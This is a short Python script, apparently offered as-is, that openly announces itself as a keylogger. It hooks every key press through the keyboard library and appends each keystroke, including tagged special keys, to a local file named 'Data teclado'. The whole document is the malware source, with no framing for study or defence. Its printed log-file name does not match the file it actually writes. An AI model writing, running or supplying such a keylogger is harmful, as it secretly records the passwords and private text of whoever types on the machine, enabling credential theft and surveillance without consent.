import keyboard

def teclasPresionadas(key):
        
        with open('Data teclado', "a") as file:

            if key.name == "space":
                file.write(" ")
            elif key.name == "enter":
                file.write("\n")
            elif key.name == "tab":
                file.write("[TAB]")
            elif key.name == "backspace":
                file.write("[BACKSPACE]")
            elif key.name == "shiftleft":
                file.write("[L.SHIFT]")
            elif key.name == "right shift":
                file.write("[R.SHIFT]")
            elif key.name == "esc":
                file.write("[ESC]")
            elif key.name == "ctrl":
                file.write("[CTRL]")
            elif key.name == "alt":
                file.write("[ALT]")
            else:
                file.write(key.name)
print(f"Keylogger iniciado. Registrando en: log_file")
keyboard.on_press(teclasPresionadas)
keyboard.wait()